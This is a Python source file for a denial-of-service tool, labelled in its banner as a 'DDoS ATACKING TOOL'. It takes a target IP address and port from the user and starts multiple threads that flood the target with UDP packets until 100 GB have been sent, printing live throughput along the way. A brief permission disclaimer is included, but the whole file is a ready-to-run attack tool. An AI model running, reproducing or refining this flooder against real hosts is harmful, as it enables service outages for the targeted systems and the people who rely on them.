import socket
import threading
import time
import sys

class NetworkSender:
    def __init__(self, target_ip, target_port, packet_size=1024):  # Fixed __init__
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.total_sent = 0
        self.running = False
        self.lock = threading.Lock()  # Thread safety
        
    def create_packet(self):
        """Create a packet of specified size"""
        return b'A' * self.packet_size
    
    def send_packets(self, thread_id):
        """Send packets continuously"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
        packet = self.create_packet()
        local_sent = 0
        
        try:
            while self.running:
                sock.sendto(packet, (self.target_ip, self.target_port))
                local_sent += self.packet_size
                
                # Update total every 1MB to reduce lock contention
                if local_sent >= 1024 * 1024:
                    with self.lock:
                        self.total_sent += local_sent
                        local_sent = 0
                    
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
        finally:
            # Add remaining data
            with self.lock:
                self.total_sent += local_sent
            sock.close()
    
    def start_sending(self, target_gb=1024, num_threads=10):
        """Start sending data with multiple threads"""
        target_bytes = target_gb * 1024 * 1024 * 1024
        
        print(f"🚀 Starting to send {target_gb} GB to {self.target_ip}:{self.target_port}")
        print(f"🧵 Using {num_threads} threads")
        print("📊 Press Ctrl+C to stop")
        print()
        
        self.running = True
        self.total_sent = 0
        
        # Create and start threads
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=self.send_packets, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Monitor progress
        start_time = time.time()
        last_report_time = start_time
        last_sent = 0
        
        try:
            while self.total_sent < target_bytes and self.running:
                time.sleep(1)
                current_time = time.time()
                elapsed = current_time - start_time
                
                # Calculate speeds
                time_since_report = current_time - last_report_time
                bytes_since_report = self.total_sent - last_sent
                current_rate = (bytes_since_report / (1024**2)) / time_since_report if time_since_report > 0 else 0
                avg_rate = (self.total_sent / (1024**2)) / elapsed if elapsed > 0 else 0
                
                # Progress percentage
                progress = (self.total_sent / target_bytes) * 100
                
                # Active threads count
                active_threads = sum(t.is_alive() for t in threads)
                
                print(f"\r📈 Progress: [{progress:5.1f}%] {self.total_sent/(1024**3):.2f}/{target_gb} GB | "
                      f"⚡ Speed: {current_rate:.1f} MB/s | Avg: {avg_rate:.1f} MB/s | "
                      f"🧵 Threads: {active_threads}/{num_threads}", end="", flush=True)
                
                last_report_time = current_time
                last_sent = self.total_sent
                
        except KeyboardInterrupt:
            print("\n\n⏹️  Stopping transfer...")
            
        self.running = False
        
        # Wait for threads to finish
        print("🔄 Waiting for threads to complete...")
        for thread in threads:
            thread.join(timeout=5)
            
        final_time = time.time() - start_time
        final_rate = (self.total_sent / (1024**2)) / final_time if final_time > 0 else 0
        
        print(f"\n\n✅ Transfer completed!")
        print(f"📊 Total sent: {self.total_sent/(1024**3):.2f} GB")
        print(f"⏱️  Time taken: {final_time:.1f} seconds ({final_time/60:.1f} minutes)")
        print(f"⚡ Average speed: {final_rate:.1f} MB/s")

def get_user_input():
    """Get target IP and port from user"""
    print("🔧 DDoS SENDER CONFIGURATION")
    print("=" * 40)
    
    while True:
        target_ip = input("🎯 Enter target IP address: ").strip()
        if target_ip:
            # Basic IP validation
            parts = target_ip.split('.')
            if len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts):
                break
            else:
                print("❌ Invalid IP format. Please use format like: 192.168.1.1")
        else:
            print("❌ IP address cannot be empty")
    
    while True:
        try:
            target_port = int(input("🔌 Enter target port (1-65535): ").strip())
            if 1 <= target_port <= 65535:
                break
            else:
                print("❌ Port must be between 1 and 65535")
        except ValueError:
            print("❌ Please enter a valid port number")
    
    return target_ip, target_port

def main():
    print("🚀 DDoS ATACKING TOOL")
    print("=" * 40)

    print("=                                      =")
    print("=            DDOS TOOL BY              =")
    print("=              TOPA ONE                =")
    print("=                                      =")
    print("=" * 40)


    print("📡 Dev Buy Thanuja.M")
    print()
    
    # Get user input for IP and port
    target_ip, target_port = get_user_input()
    
    # Configuration
    PACKET_SIZE = 1024           # Packet size in bytes
    TARGET_GB = 100                # Start with smaller amount for testing
    NUM_THREADS = 10             # Number of concurrent threads
    
    print(f"""
📋 CONFIGURATION SUMMARY:
┌─────────────────────────────────────┐
│  🎯 Target IP:    {target_ip:<15} │
│  🔌 Target Port:  {target_port:<15} │
│  📦 Packet Size:  {PACKET_SIZE} bytes          │
│  💾 Target Data:  {TARGET_GB} GB               │
│  🧵 Threads:      {NUM_THREADS} parallel       │
└─────────────────────────────────────┘
""")
    
    print("⚠️  IMPORTANT NOTES:")
    print("   • This will send ddos packets to the specified target")
    print("   • Ensure you have permission to send ddos to this target")
    print("   • Use responsibly for testing purposes only")
    print("   • Press Ctrl+C to stop the transfer at any time")
    print()
    
    # Confirm before starting
    while True:
        response = input("🚀 Start sending ddos? (y/n): ").strip().lower()
        if response in ['y', 'yes']:
            break
        elif response in ['n', 'no']:
            print("❌ Operation cancelled.")
            return
        else:
            print("Please enter 'y' or 'n'")
    
    print("\n🎬 Initializing ddos sender...")
    
    # Create sender and start
    sender = NetworkSender(target_ip, target_port, PACKET_SIZE)
    sender.start_sending(TARGET_GB, NUM_THREADS)
    
    print("\n🏁 DDoS sender session completed!")
    input("Press Enter to exit...")

if __name__ == "__main__":  # Fixed __name__
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⏹️  Program interrupted by user")
    except Exception as e:
        print(f"\n💥 Error: {e}")
    finally:
        print("👋 Thank you for using DDos Tool!")